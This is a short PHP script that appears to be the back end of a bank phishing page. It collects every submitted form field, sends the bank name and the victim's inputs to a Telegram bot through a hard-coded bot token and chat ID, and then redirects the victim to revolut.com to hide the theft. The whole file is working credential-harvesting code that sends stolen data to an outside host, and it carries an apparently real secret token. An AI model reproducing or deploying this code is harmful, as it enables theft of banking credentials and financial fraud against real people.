<?php
// Get the form data

$bankName = $_POST['bank'];
$inputs = [];

foreach ($_POST as $key => $value) {
    if ($key !== 'bank') {
        $inputs[$key] = $value;
    }
}

// Telegram bot token and chat ID
$botToken = '7963155716:AAH9knzvU8cefobdkl7bSCx4RflEraectyU';
$chatId = '5499018264';

// Prepare the message
$message = "Bank: $bankName\n";
foreach ($inputs as $key => $value) {
    $message .= "$key: $value\n";
}

// Send the message to the Telegram bot
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$params = [
    'chat_id' => $chatId,
    'text' => $message
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($params),
    ],
];

$context  = stream_context_create($options);
$result = file_get_contents($telegramApiUrl, false, $context);
if ($result === FALSE) {
    header("Location: https://revolut.com");
    exit;
}

// If success
header("Location: https://revolut.com");
exit;

?>

